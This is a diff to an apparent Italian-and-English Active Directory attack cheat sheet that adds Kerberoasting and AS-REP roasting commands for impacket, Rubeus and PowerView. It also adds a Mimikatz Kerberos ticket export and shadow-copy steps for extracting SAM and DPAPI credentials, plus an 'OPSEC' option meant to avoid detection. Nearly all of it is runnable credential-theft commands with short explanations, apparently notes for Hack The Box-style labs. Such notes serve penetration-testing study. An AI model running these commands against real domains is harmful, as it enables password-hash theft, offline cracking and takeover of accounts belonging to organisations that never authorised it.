@@ -329,8 +329,60 @@ responder.py -I eth0 -rdwv
 git clone https://github.com/t0thkr1s/gpp-decrypt #scarico il tool
 #lo runno passandolgi il file .xml e ottengo la password
 
-#ASREPRoasting Kerberosting
+#Kerberosting
+#Tutti gli utenti standard del dominio possono richiedere una copia di tutti gli account di servizio insieme ai relativi hash delle password.
+#Questo significa che possiamo richiedere un TGS (Ticket Granting Service) per qualsiasi SPN (Service Principal Name) associato a un account utente, estrarre il blob crittografato (che è stato cifrato usando la password di quell'utente), e poi forzarlo offline con un attacco a forza bruta.
+#impacket
 GetUserSPNs.py  -request -dc-ip 10.10.10.100 active.htb/SVC_TGS -save -outputfile GetUserSPNs.out
+
+#Kerberoasting and outputing on a file with a specific format
+Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName>
+
+#Kerberoasting whle being "OPSEC" safe, essentially while not try to roast AES enabled accounts
+Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName> /rc4opsec
+
+#Kerberoast AES enabled accounts
+Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName> /aes
+
+#Kerberoast specific user account
+Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName> /user:<username> /simple
+
+#Kerberoast by specifying the authentication credentials
+Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName> /creduser:<username> /credpassword:<password>
+
+#PowerView
+#Get User Accounts that are used as Service Accounts
+Get-NetUser -SPN
+
+#Get every available SPN account, request a TGS and dump its hash
+Invoke-Kerberoast
+
+#Requesting the TGS for a single account:
+Request-SPNTicket
+
+
+#ASREPRoast
+#Se un account utente di dominio non richiede la preautenticazione Kerberos, possiamo richiedere un TGT (Ticket Granting Ticket) valido per quell’account senza nemmeno avere le credenziali del dominio, estrarre il blob crittografato e poi forzarlo offline con un attacco a forza bruta.
+
+#Impacket
+#Trying the attack for the specified users on the file
+python GetNPUsers.py <domain_name>/ -usersfile <users_file> -outputfile <FileName>
+
+#Rubeus
+#Trying the attack for all domain users
+Rubeus.exe asreproast /format:<hashcat|john> /domain:<DomainName> /outfile:<filename>
+
+#ASREPRoast specific user
+Rubeus.exe asreproast /user:<username> /format:<hashcat|john> /domain:<DomainName> /outfile:<filename>
+
+#ASREPRoast users of a specific OU (Organization Unit)
+Rubeus.exe asreproast /ou:<OUName> /format:<hashcat|john> /domain:<DomainName> /outfile:<filename>
+
+
+
+
+#Export all tickets using Mimikatz
+Invoke-Mimikatz -Command '"kerberos::list /export"'
 
 #Lista utenti AD
 python3 /opt/impacket/examples/lookupsid.py anonymous@$IP
@@ -403,6 +455,24 @@ mimikatz ts::sessions
 #List Vault credentials
 mimikatz vault::list
 
+#ShadowCopy
+#Se si è local admin sulla macchina si può provare a fare la shadow copy
+#List shadow copies using vssadmin (Needs Admnistrator Access)
+vssadmin list shadows
+
+#List shadow copies using diskshadow
+diskshadow list shadows all
+
+#Make a symlink to the shadow copy and access it
+mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
+
+#fatto questo si può:
+#Puoi estrarre il database SAM presente nei backup ed ottenere le credenziali.
+#Cerca le credenziali memorizzate tramite DPAPI (Data Protection API) e decrittale.
+#Accedi ai file sensibili contenuti nei backup.
+
+
 
 
 ```
+https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet
